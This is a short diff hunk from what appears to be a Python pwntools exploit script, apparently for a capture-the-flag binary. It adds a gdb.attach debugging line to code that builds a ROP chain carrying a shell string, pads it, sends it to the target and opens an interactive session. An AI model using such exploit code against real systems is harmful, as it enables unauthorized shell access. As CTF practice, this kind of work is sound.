@@ -55,5 +55,6 @@ print len(rop.chain())
 rop.raw(sh + '\x00')
 rop.raw('U' * (100 - len(rop.chain())))
 
+gdb.attach(r)
 r.sendline(rop.chain())
 r.interactive()
